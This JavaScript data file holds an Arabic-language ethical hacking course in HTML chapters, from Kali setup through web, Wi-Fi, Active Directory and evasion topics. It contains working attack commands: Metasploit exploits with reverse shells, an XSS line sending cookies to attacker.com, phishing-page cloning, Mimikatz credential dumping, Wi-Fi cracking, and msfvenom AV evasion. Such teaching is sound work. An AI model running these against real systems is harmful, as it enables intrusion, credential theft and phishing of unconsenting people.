export const redTeamData = {
  id: 'red-team',
  title: 'Red Team',
  emoji: '🔴',
  color: 'red',
  description: 'منهج متكامل من 3 مستويات - الهجوم الأخلاقي واختبار الاختراق',
  level: 'مبتدئ / متوسط / متقدم',
  chaptersCount: 27,
  pages: '~200 صفحة',
  icon: 'fa-fist-raised',
  chapters: [
    // ==================== المستوى الأول: مبتدئ (الفصول 1-9) ====================
    {
      number: 1,
      title: '[مبتدئ] مقدمة في الهكر الأخلاقي و Red Team',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: ما هو الهكر الأخلاقي؟</h2>
        <p><strong>الهكر الأخلاقي (Ethical Hacking):</strong> استخدام مهارات القرصنة لاختبار أمن الأنظمة بإذن مسبق. الهدف هو اكتشاف الثغرات قبل أن يستغلها المخترقون الحقيقيون.</p>
        <p><strong>Red Team:</strong> فريق متخصص في محاكاة الهجمات الحقيقية لتقييم قدرة الدفاع لدى المؤسسة. يختلف عن اختبار الاختراق التقليدي في كونه أوسع (يشمل الهندسة الاجتماعية والهجمات المادية).</p>
        <p><strong>مراحل اختبار الاختراق القياسي (PTES - Penetration Testing Execution Standard):</strong></p>
        <ol>
          <li>جمع المعلومات (Information Gathering)</li>
          <li>المسح الضوئي (Scanning)</li>
          <li>استغلال الثغرات (Exploitation)</li>
          <li>رفع الامتيازات والثبات (Post-Exploitation)</li>
          <li>إزالة الأثر (Covering Tracks)</li>
          <li>كتابة التقارير (Reporting)</li>
        </ol>
        <div class="note-box">
          🔐 <strong>قاعدة ذهبية:</strong> لا تختبر أبداً نظاماً ليس لديك إذن كتابي باختباره. الالتزام بالأخلاقيات هو أساس هذا المجال.
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه قانوني:</strong> في مصر، قانون مكافحة الجرائم الإلكترونية رقم 175 لسنة 2018 يجرم الاختراق غير المصرح به ويعاقب بالحبس والغرامة.
        </div>
      `
    },
    {
      number: 2,
      title: '[مبتدئ] تجهيز بيئة العمل - تثبيت Kali Linux والأدوات الأساسية',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: إنشاء مختبر الاختراق الخاص بك</h2>
        <p>سنستخدم <strong>Kali Linux</strong> كتوزيعة أساسية لأنها تأتي محملة بأكثر من 600 أداة اختراق.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">طريقة التثبيت (على VirtualBox):</h3>
        <ul>
          <li>تحميل صورة Kali Linux من <a href="https://www.kali.org/get-kali/" target="_blank">الموقع الرسمي</a> (اختر الإصدار Installer Image).</li>
          <li>تثبيت VirtualBox وإنشاء جهاز افتراضي بمواصفات: 4GB RAM، 40GB قرص صلب، معالج ثنائي النواة.</li>
          <li>تثبيت Kali Linux واختيار بيئة XFCE (خفيفة وسريعة).</li>
          <li>بعد التثبيت، تحديث النظام وتثبيت الأدوات الإضافية.</li>
        </ul>
        <div class="code-block">
# تحديث Kali Linux
sudo apt update && sudo apt upgrade -y
sudo apt install kali-linux-headless   # تثبيت مجموعة الأدوات الأساسية
sudo apt install metasploit-framework nmap burpsuite sqlmap wireshark john -y
        </div>
        <div class="fig-box">
          <i class="fas fa-desktop text-neon text-2xl mb-2 block"></i>
          الشكل 2.1: واجهة Kali Linux بعد التثبيت
        </div>
        <div class="note-box">
          📌 <strong>نشاط 1:</strong> قم بتثبيت Kali Linux على جهاز افتراضي. تأكد من أنك تستطيع تشغيله والوصول إلى الطرفية (Terminal).
        </div>
      `
    },
    {
      number: 3,
      title: '[مبتدئ] أساسيات الشبكات للمخترق الأخلاقي',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: كيف تتحرك البيانات؟</h2>
        <p>فهم الشبكات هو أساس الاختراق.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مفاهيم أساسية:</h3>
        <ul>
          <li><strong>عنوان IP (IPv4/IPv6):</strong> المعرف الفريد للجهاز على الشبكة.</li>
          <li><strong>المنافذ (Ports):</strong> نقاط دخول للخدمات (مثال: 80 HTTP، 443 HTTPS، 22 SSH).</li>
          <li><strong>TCP vs UDP:</strong> TCP موثوق (يستخدم للمتصفحات والبريد)، UDP أسرع (يستخدم للبث المباشر والألعاب).</li>
          <li><strong>DNS (Domain Name System):</strong> يحول الأسماء إلى عناوين IP.</li>
        </ul>
        <div class="code-block">
# أوامر لاستكشاف الشبكة من Kali
ip a                     # عرض واجهات الشبكة وعناوين IP
netstat -tulpn           # عرض المنافذ المفتوحة والخدمات
ping google.com          # اختبار الاتصال
traceroute google.com    # تتبع مسار الحزم
nslookup masry0-store.vercel.app   # استعلام DNS
        </div>
      `
    },
    {
      number: 4,
      title: '[مبتدئ] أساسيات لينكس للمخترق',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: التحكم في نظام التشغيل</h2>
        <p>ستكون معظم أدوات الاختراق على لينكس، لذا يجب إتقان أساسياته.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أوامر أساسية:</h3>
        <ul>
          <li><code>ls</code> – عرض الملفات والمجلدات.</li>
          <li><code>cd</code> – تغيير المجلد الحالي.</li>
          <li><code>pwd</code> – عرض المسار الحالي.</li>
          <li><code>mkdir</code> – إنشاء مجلد.</li>
          <li><code>rm</code> – حذف ملفات.</li>
          <li><code>chmod</code> – تغيير صلاحيات الملفات.</li>
          <li><code>sudo</code> – تنفيذ أمر بصلاحيات الجذر.</li>
          <li><code>grep</code> – البحث داخل النصوص.</li>
          <li><code>find</code> – البحث عن ملفات.</li>
        </ul>
        <div class="code-block">
# أمثلة عملية
whoami               # معرفة اسم المستخدم الحالي
sudo -l              # معرفة الأوامر المسموح بها
find / -perm -4000 2>/dev/null   # البحث عن ملفات SUID (قد تساعد في رفع الامتيازات)
ps aux | grep apache   # عرض عمليات Apache
        </div>
        <div class="note-box">
          📌 <strong>نشاط 2:</strong> جرب الأوامر أعلاه على جهاز Kali الخاص بك. أنشئ ملفاً نصياً، غيّر صلاحياته، وابحث عن نص بداخله باستخدام grep.
        </div>
      `
    },
    {
      number: 5,
      title: '[مبتدئ] جمع المعلومات (OSINT) باستخدام أدوات بسيطة',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: معلومات مجانية – كيف تجمعها؟</h2>
        <p>جمع المعلومات (OSINT) هو أول مرحلة في أي اختبار اختراق. الهدف هو جمع أكبر قدر من البيانات عن الهدف من مصادر عامة.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أدوات OSINT بسيطة:</h3>
        <ul>
          <li><strong>theHarvester:</strong> لجمع عناوين البريد الإلكتروني والنطاقات الفرعية.</li>
          <li><strong>whois:</strong> للحصول على معلومات عن مالك النطاق.</li>
          <li><strong>nslookup/dig:</strong> لاستعلام DNS.</li>
        </ul>
        <div class="code-block">
# أمثلة عملية
theHarvester -d example.com -b google
whois example.com
nslookup -type=MX example.com
dig example.com ANY
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> جمع المعلومات من مصادر عامة مسموح به قانونياً، لكن لا تستخدمها لاختراق أنظمة لا تملك الإذن.
        </div>
        <div class="note-box">
          📌 <strong>نشاط 3:</strong> استخدم theHarvester لجمع معلومات عن نطاق شركة حقيقية (مثل microsoft.com). لاحظ كمية البيانات التي يمكن جمعها.
        </div>
      `
    },
    {
      number: 6,
      title: '[مبتدئ] المسح الضوئي باستخدام Nmap – الأساسيات',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: اكتشاف المنافذ والخدمات المفتوحة</h2>
        <p>Nmap هو أداة المسح الضوئي الأكثر شهرة. أوامر أساسية:</p>
        <div class="code-block">
# فحص سريع لأشهر 1000 منفذ
nmap 192.168.1.1

# فحص منافذ محددة
nmap -p 22,80,443 192.168.1.1

# فحص نطاق من عناوين IP
nmap 192.168.1.1-254

# فحص نصف اتصال (أسرع وأقل وضوحاً)
nmap -sS 192.168.1.1

# اكتشاف إصدارات الخدمات
nmap -sV 192.168.1.1
        </div>
        <div class="fig-box">
          <i class="fas fa-terminal text-neon text-2xl mb-2 block"></i>
          الشكل 6.1: نتيجة تشغيل Nmap تظهر المنافذ المفتوحة والخدمات
        </div>
        <div class="note-box">
          📌 <strong>نشاط 4:</strong> قم بمسح شبكتك المنزلية باستخدام Nmap. هل تتعرف على الأجهزة المتصلة؟ ما هي المنافذ المفتوحة؟
        </div>
      `
    },
    {
      number: 7,
      title: '[مبتدئ] مقدمة إلى Metasploit – أول استغلال',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: الحصول على وصول أولي</h2>
        <p>Metasploit هو إطار عمل لاستغلال الثغرات. سنستخدمه لاختراق جهاز هدف ضعيف (على سبيل المثال، ثغرة vsftpd القديمة).</p>
        <div class="code-block">
# فتح Metasploit
msfconsole

# البحث عن ثغرة vsftpd
search vsftpd

# استخدام exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# عرض الخيارات
show options

# تعيين عنوان IP للهدف
set RHOSTS 192.168.1.10

# تعيين الحمولة (payload)
set PAYLOAD cmd/unix/interact

# تنفيذ الاستغلال
exploit
        </div>
        <p>إذا نجح الاستغلال، ستحصل على جلسة shell. يمكنك تنفيذ أوامر على الجهاز الهدف.</p>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> هذه الثغرة قديمة جداً ولا تعمل على الأنظمة الحديثة. استخدمها فقط في بيئة مختبرية آمنة (مثل Metasploitable).
        </div>
      `
    },
    {
      number: 8,
      title: '[مبتدئ] رفع الامتيازات الأساسي – البحث عن SUID',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: من مستخدم عادي إلى جذر</h2>
        <p>بعد الحصول على وصول أولي (عادة بصلاحيات محدودة)، نحتاج إلى رفع الامتيازات إلى الجذر (root) للتحكم الكامل.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">البحث عن ملفات SUID:</h3>
        <p>الملفات التي تحمل بت SUID يتم تشغيلها بصلاحيات مالك الملف (غالباً الجذر). يمكن استغلالها لرفع الامتيازات.</p>
        <div class="code-block">
# داخل جلسة shell (بعد الاستغلال)
find / -perm -4000 2>/dev/null
        </div>
        <p>إذا وجدت ملفاً مثل <code>/usr/bin/vim</code> أو <code>/usr/bin/nano</code>، يمكنك تشغيله لفتح ملف حساس مثل <code>/etc/shadow</code>.</p>
        <div class="code-block">
# مثال: استغلال vim SUID
/usr/bin/vim /etc/shadow
        </div>
      `
    },
    {
      number: 9,
      title: '[مبتدئ] مراجعة المستوى الأول واختبار',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما الفرق بين الهكر الأخلاقي و Red Team؟</li>
          <li>ما هي مراحل اختبار الاختراق PTES؟</li>
          <li>كيف تقوم بتحديث Kali Linux عبر الطرفية؟</li>
          <li>ما هو أمر Nmap لفحص منفذ 443 فقط على هدف؟</li>
          <li>اذكر ثلاث أدوات لجمع المعلومات (OSINT).</li>
          <li>كيف تبحث عن ملفات SUID على نظام لينكس؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بتحميل وتثبيت <strong>Metasploitable 2</strong> (جهاز هدف ضعيف جداً). استخدم Nmap لمسحه، ثم استغل ثغرة vsftpd باستخدام Metasploit للحصول على shell. ارفع امتيازاتك باستخدام SUID (ابحث عن ملف قابل للاستغلال). دوّن كل خطوة.</p>
      `
    },
    // ==================== المستوى الثاني: متوسط (الفصول 10-18) ====================
    {
      number: 10,
      title: '[متوسط] هجمات تطبيقات الويب – SQL Injection',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: اختراق قواعد البيانات</h2>
        <p>ثغرة SQL Injection هي من أقدم وأخطر الثغرات. تسمح للمهاجم بتنفيذ استعلامات SQL على قاعدة البيانات.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">كيف تعمل؟</h3>
        <p>تطبيق الويب الضعيف لا يقوم بتنقية (sanitize) المدخلات. لذلك يمكن للمهاجم إدخال كود SQL ضار.</p>
        <div class="code-block">
# مثال على استعلام SQL ضعيف في كود PHP:
$sql = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";

# إذا أدخل المهاجم: admin' --
# يصبح الاستعلام:
SELECT * FROM users WHERE username = 'admin' -- '
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أتمتة الهجوم باستخدام sqlmap</h3>
        <div class="code-block">
# اكتشاف SQLi
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# استخراج قواعد البيانات والجداول
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# استخراج البيانات
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> لا تستخدم sqlmap على مواقع حقيقية دون إذن. استخدم منصات تدريب مثل PortSwigger Web Security Academy.
        </div>
      `
    },
    {
      number: 11,
      title: '[متوسط] هجمات تطبيقات الويب – XSS و CSRF',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: هجمات الويب الجانبية (Client-Side)</h2>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Cross-Site Scripting (XSS)</h3>
        <p>حقن كود JavaScript في صفحات الويب لتنفيذه في متصفح الضحية. أنواعه: Reflected، Stored، DOM-based.</p>
        <div class="code-block">
# مثال على هجوم XSS بسيط (Reflected)
&lt;script&gt;alert('XSS')&lt;/script&gt;

# سرقة الكوكيز (يمكن استخدامها لسرقة الجلسات)
&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Cross-Site Request Forgery (CSRF)</h3>
        <p>خداع المستخدم لتنفيذ إجراءات غير مرغوب فيها (مثل تغيير كلمة المرور) دون علمه.</p>
        <div class="code-block">
# مثال: طلب POST خفي لتغيير البريد الإلكتروني
&lt;form action="https://target.com/change_email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="attacker@example.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
        </div>
      `
    },
    {
      number: 12,
      title: '[متوسط] استغلال الثغرات باستخدام Metasploit (متقدم)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: استخدام Metasploit بشكل احترافي</h2>
        <p>سنقوم بإنشاء جلسة Meterpreter (أداة قوية للتحكم في الجهاز المخترق).</p>
        <div class="code-block">
# تشغيل Metasploit
msfconsole

# البحث عن ثغرة على نظام Windows
search eternalblue

# استخدام exploit
use exploit/windows/smb/ms17_010_eternalblue

# تعيين الخيارات
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5   # عنوان Kali
set LPORT 4444

# تنفيذ
exploit
        </div>
        <p>بعد النجاح، ستحصل على جلسة Meterpreter. أوامر مفيدة:</p>
        <ul>
          <li><code>sysinfo</code> – معلومات النظام.</li>
          <li><code>getuid</code> – الصلاحيات الحالية.</li>
          <li><code>ps</code> – عرض العمليات.</li>
          <li><code>migrate PID</code> – الانتقال إلى عملية أخرى (للثبات).</li>
          <li><code>shell</code> – فتح shell عادي للنظام.</li>
          <li><code>upload /local/file /remote/path</code> – رفع ملف.</li>
          <li><code>download /remote/file /local/path</code> – تنزيل ملف.</li>
        </ul>
      `
    },
    {
      number: 13,
      title: '[متوسط] الهندسة الاجتماعية وأدواتها',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: استغلال العنصر البشري</h2>
        <p>الهندسة الاجتماعية (Social Engineering) هي خداع الأشخاص بدلاً من الأجهزة. أشهر أداة هي <strong>Social-Engineer Toolkit (SET)</strong>.</p>
        <div class="code-block">
# تشغيل SET
sudo setoolkit

# اختر 1) Social-Engineering Attacks
# ثم 2) Website Attack Vectors
# ثم 3) Credential Harvester Attack Method
# ثم 2) Site Cloner (استنساخ صفحة تسجيل دخول حقيقية)

# أدخل عنوان IP الخاص بك (الذي سترسل الضحية إليه)
# أدخل عنوان URL لصفحة تسجيل الدخول الحقيقية (مثل https://accounts.google.com)
        </div>
        <p>بعد ذلك، ستنشأ صفحة وهمية. أرسل الرابط إلى الضحية (في بيئة اختبار قانونية). عند إدخال بياناته، ستُرسل إليك.</p>
        <div class="warning-box">
          ⚠️ <strong>تنبيه أخلاقي:</strong> لا تستخدم هذه الأداة ضد أشخاص حقيقيين دون إذن. استخدمها فقط في تمارين قانونية أو على نفسك.
        </div>
      `
    },
    {
      number: 14,
      title: '[متوسط] اختراق الشبكات اللاسلكية (Wi-Fi)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: كسر شبكات الواي فاي</h2>
        <p>اختراق شبكات Wi-Fi المحمية بـ WPA/WPA2 يتطلب التقاط حزمة "المصافحة الرباعية" (4-way handshake) ثم كسر المفتاح باستخدام قائمة كلمات مرور.</p>
        <div class="code-block">
# تشغيل وضع المراقبة
sudo airmon-ng start wlan0

# فحص الشبكات
sudo airodump-ng wlan0mon

# التقاط الحزم على شبكة معينة
sudo airodump-ng -c 6 --bssid [BSSID] -w capture wlan0mon

# في نافذة أخرى، قم بإرسال حزمة deauth لفرض إعادة المصافحة
sudo aireplay-ng -0 2 -a [BSSID] wlan0mon

# كسر المفتاح
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> لا تجرب هذه الأوامر على شبكات ليست ملكك. في مصر، اختراق شبكات الواي فاي دون إذن يعتبر جريمة.
        </div>
      `
    },
    {
      number: 15,
      title: '[متوسط] اختراق الشبكات الداخلية ونقل الحركة (Pivoting)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: من جهاز إلى الشبكة بأكملها</h2>
        <p>بعد اختراق جهاز واحد داخل الشبكة (غالباً نقطة دخول ضعيفة)، يمكننا استخدامه كنقطة انطلاق لاختراق أجهزة أخرى لا يمكن الوصول إليها مباشرة. هذه العملية تسمى <strong>Pivoting</strong>.</p>
        <div class="code-block">
# من داخل جلسة Meterpreter
run autoroute -s 192.168.10.0/24   # إضافة مسار للشبكة الداخلية

# الخروج إلى الخلفية
background

# استخدام وحدة فحص المنافذ على الشبكة الداخلية
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.5
set PORTS 22,80,443
run
        </div>
        <p>أدوات أخرى لنقل الحركة: <strong>Chisel</strong>، <strong>SSH Tunneling</strong>، <strong>ProxyChains</strong>.</p>
      `
    },
    {
      number: 16,
      title: '[متوسط] رفع الامتيازات على ويندوز (PowerUp و JuicyPotato)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: من مستخدم عادي إلى مسؤول نظام</h2>
        <p>في بيئة ويندوز، توجد أدوات آلية لرفع الامتيازات. من أشهرها <strong>PowerUp</strong> (ضمن PowerSploit) و <strong>JuicyPotato</strong>.</p>
        <div class="code-block">
# رفع سكريبت PowerUp إلى الجهاز المستهدف (عبر جلسة Meterpreter)
upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1

# تنفيذه في جلسة shell
powershell -ep bypass
. .\\PowerUp.ps1
Invoke-AllChecks
        </div>
        <p>إذا وجدت خدمة قابلة للاستغلال (مثل خدمة تعمل بصلاحيات النظام)، يمكنك استغلالها.</p>
      `
    },
    {
      number: 17,
      title: '[متوسط] اختراق Active Directory',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: استهداف البنية التحتية للمؤسسات</h2>
        <p>معظم الشركات تستخدم Active Directory (AD) لإدارة المستخدمين والأجهزة. اختراق AD هو هدف متقدم.</p>
        <ul>
          <li><strong>BloodHound:</strong> أداة لرسم علاقات AD واكتشاف مسارات الهجوم.</li>
          <li><strong>Mimikatz:</strong> لاستخراج كلمات المرور من الذاكرة (بعد الحصول على صلاحيات عالية).</li>
          <li><strong>Kerberoasting:</strong> هجوم لاستخراج تجزئات كلمات مرور حسابات الخدمة.</li>
        </ul>
        <div class="code-block">
# بعد الحصول على صلاحيات عالية على جهاز منضم إلى AD
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords   # عرض كلمات مرور المستخدمين المخزنة في الذاكرة
        </div>
      `
    },
    {
      number: 18,
      title: '[متوسط] مراجعة المستوى الثاني واختبار',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>اشرح ثغرة SQL Injection واكتب مثالاً على إدخال ضار.</li>
          <li>ما الفرق بين XSS و CSRF؟</li>
          <li>كيف يمكنك استغلال ثغرة EternalBlue باستخدام Metasploit؟</li>
          <li>ما هي أداة SET وماذا تفعل؟</li>
          <li>ما هي خطوات اختراق شبكة Wi-Fi محمية بـ WPA2؟</li>
          <li>ما معنى Pivoting في سياق اختبار الاختراق؟</li>
          <li>اذكر أداة لرفع الامتيازات على ويندوز وطريقة استخدامها.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> قم بتحميل <strong>Metasploitable 3</strong> (جهاز هدف ويندوز ضعيف). استخدم Nmap لاكتشاف الثغرات، ثم استغل ثغرة EternalBlue باستخدام Metasploit. احصل على جلسة Meterpreter، وقم باستخراج معلومات النظام، وحمّل أداة PowerUp واجري فحصاً لرفع الامتيازات.</p>
      `
    },
    // ==================== المستوى الثالث: متقدم (الفصول 19-27) ====================
    {
      number: 19,
      title: '[متقدم] أتمتة اختبار الاختراق باستخدام Python',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: كتابة أدواتك الخاصة</h2>
        <p>الأتمتة تزيد من كفاءة المخترق الأخلاقي. سنتعلم كتابة سكريبتات بايثون بسيطة لأتمتة المهام.</p>
        <div class="code-block">
# سكريبت لفحص المنافذ المفتوحة
import socket

def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

target = "192.168.1.1"
for port in range(1, 1025):
    if scan_port(target, port):
        print(f"Port {port} is open")
        </div>
        <div class="code-block">
# سكريبت بسيط لاختبار SQLi (تجميعي)
import requests

url = "http://target.com/page?id="
payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--"]

for payload in payloads:
    r = requests.get(url + payload)
    if "error" in r.text.lower() or "mysql" in r.text.lower():
        print(f"Potential SQLi with payload: {payload}")
        </div>
      `
    },
    {
      number: 20,
      title: '[متقدم] التحضير لشهادة OSCP (Offensive Security Certified Professional)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: كيف تحصل على أشهر شهادة في الاختراق؟</h2>
        <p>شهادة OSCP هي معيار الذهب في مجال اختبار الاختراق. تتطلب اجتياز امتحان عملي مدته 24 ساعة لاختراق عدة أجهزة في شبكة معزولة.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">كيف تستعد؟</h3>
        <ul>
          <li>خذ دورة PEN-200 الرسمية من OffSec (التي تغطي المواد الأساسية).</li>
          <li>تدرب على منصات CTF مثل <strong>HackTheBox</strong> و <strong>Proving Grounds</strong>.</li>
          <li>ادرس تقارير الاختراق (write-ups) السابقة.</li>
          <li>أنشئ مختبراً منزلياً يحتوي على أجهزة لينكس وويندوز صعبة.</li>
        </ul>
        <div class="note-box">
          🎯 <strong>نصيحة:</strong> ركز على: استغلال الثغرات (Buffer Overflow على لينكس)، رفع الامتيازات على كل من ويندوز ولينكس، واختراق Active Directory (بما في ذلك Kerberoasting و Pass-the-Hash).
        </div>
      `
    },
    {
      number: 21,
      title: '[متقدم] اختراق تطبيقات الويب الحديثة – JWT, GraphQL, SSRF',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: ثغرات العصر الحديث</h2>
        <ul>
          <li><strong>JWT (JSON Web Token) Attacks:</strong> تغيير التوقيع، خوارزمية none، استخدام مفاتيح ضعيفة.</li>
          <li><strong>GraphQL Injection:</strong> استغلال نقاط نهاية GraphQL لاستخراج البيانات أو إرهاق الخادم.</li>
          <li><strong>SSRF (Server-Side Request Forgery):</strong> إجبار الخادم على إرسال طلبات إلى أنظمة داخلية لا يمكن الوصول إليها مباشرة.</li>
        </ul>
        <div class="code-block">
# مثال: استغلال SSRF لقراءة ملف محلي
http://target.com/load?url=http://localhost/admin

# استخدام بروتوكول file:// لقراءة ملفات النظام (إذا كان مسموحاً)
http://target.com/load?url=file:///etc/passwd
        </div>
      `
    },
    {
      number: 22,
      title: '[متقدم] تجاوز أنظمة الحماية (AV/EDR) باستخدام تقنيات متقدمة',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: كيف تختبئ من برامج الحماية؟</h2>
        <p>برامج مكافحة الفيروسات وأنظمة EDR (Endpoint Detection and Response) تعقد مهمة المخترق. تقنيات التجاوز تشمل:</p>
        <ul>
          <li><strong>تشويب (Obfuscation):</strong> تغيير شكل الكود مع الحفاظ على وظيفته (مثل استخدام الإكسور).</li>
          <li><strong>تشغيل payloads في الذاكرة فقط (Fileless Malware).</strong></li>
          <li><strong>استخدام تقنيات injection في عمليات شرعية (مثل Process Hollowing).</strong></li>
          <li><strong>ترميز (Encoding) الحمولات وتشفيرها قبل الإرسال.</strong></li>
        </ul>
        <div class="code-block">
# إنشاء حمولة (payload) مشوهة باستخدام msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload_encoded.exe

# تغيير اسم الملف وعلاماته الزمنية لتجنب الكشف
        </div>
      `
    },
    {
      number: 23,
      title: '[متقدم] تحليل البرامج الضارة (Malware Analysis) للمخترق',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: فهم ما يحدث داخل الملف الخبيث</h2>
        <p>كRed Team، قد تحتاج إلى تحليل أدوات خصومك (أو أدواتك). سنغطي أساسيات التحليل الساكن والديناميكي.</p>
        <ul>
          <li><strong>التحليل الساكن:</strong> استخدام <code>strings</code>، <code>pefile</code>، <code>Detect It Easy</code> لفحص الملف دون تشغيله.</li>
          <li><strong>التحليل الديناميكي:</strong> تشغيل العينة في بيئة معزولة (REMnux) ومراقبة السلوك باستخدام <code>ProcMon</code> و <code>Wireshark</code>.</li>
        </ul>
        <div class="code-block">
# استخراج السلاسل النصية
strings suspicious.exe | grep -i "http"

# حساب التجزئة
sha256sum suspicious.exe
        </div>
      `
    },
    {
      number: 24,
      title: '[متقدم] حرب الشبكات (Network Eavesdropping & MiTM)',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: التنصت على الشبكة المحلية</h2>
        <p>إذا كنت موجوداً فعلياً على نفس الشبكة المحلية للهدف، يمكنك استخدام هجمات ARP Spoofing أو DHCP Spoofing لاعتراض حركة المرور.</p>
        <div class="code-block">
# استخدام ettercap (واجهة سطر أوامر)
sudo ettercap -T -M arp:remote /target_ip// /gateway_ip//

# استخدام bettercap (أداة حديثة)
sudo bettercap
net.show
set arp.spoof.targets target_ip
arp.spoof on
net.sniff on
        </div>
        <p>بعد الاعتراض، يمكنك استخراج كلمات المرور المرسلة عبر بروتوكولات غير مشفرة (HTTP, FTP, Telnet).</p>
      `
    },
    {
      number: 25,
      title: '[متقدم] كتابة تقارير اختراق احترافية',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: تسويق نجاحك</h2>
        <p>التقرير الجيد هو ما يفرق بين اختبار اختراق عادي وآخر احترافي. يجب أن يحتوي على:</p>
        <ul>
          <li><strong>ملخص تنفيذي:</strong> للإدارة العليا (يشرح النتائج الرئيسية بلغة غير تقنية).</li>
          <li><strong>نطاق الاختبار:</strong> الأصول التي تم اختبارها، التواريخ، أنواع الاختبار.</li>
          <li><strong>المنهجية:</strong> الأدوات والتقنيات المستخدمة (Nmap, Metasploit, Burp Suite).</li>
          <li><strong>الثغرات المكتشفة:</strong> مرتبة حسب الخطورة (Critical, High, Medium, Low).</li>
          <li><strong>إثبات المفهوم (PoC):</strong> لكل ثغرة، مع أوامر ولقطات شاشة.</li>
          <li><strong>توصيات الإصلاح:</strong> خطوات واضحة وقابلة للتطبيق.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-file-pdf text-neon text-2xl mb-2 block"></i>
          الشكل 25.1: نموذج تقرير اختبار اختراق
        </div>
      `
    },
    {
      number: 26,
      title: '[متقدم] خطة التعلم لمدة 12 شهراً لتصبح Penetration Tester',
      content: `
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من الصفر إلى OSCP</h2>
        <ul>
          <li><strong>الشهر 1-2:</strong> تعلم أساسيات الشبكات ولينكس (شهادة Network+, Linux+).</li>
          <li><strong>الشهر 3-4:</strong> دراسة دورة eJPT (Junior Penetration Tester) من eLearnSecurity (عملية).</li>
          <li><strong>الشهر 5-6:</strong> التدرب على TryHackMe و HackTheBox (آلات سريعة).</li>
          <li><strong>الشهر 7-9:</strong> دورة PEN-200 (الخاصة بـ OSCP) – الدراسة وتمارين المختبر.</li>
          <li><strong>الشهر 10-12:</strong> حل آلات من Proving Grounds و VulnHub، ثم التقدم لامتحان OSCP.</li>
        </ul>
        <div class="note-box">
          💡 <strong>نصيحة:</strong> أنشئ مدونة أو قناة يوتيوب لتوثيق رحلتك. هذا يساعد في بناء سمعتك وجذب فرص عمل.
        </div>
      `
    },
    {
      number: 27,
      title: '[متقدم] مراجعة المستوى الثالث والمشروع النهائي',
      content: `
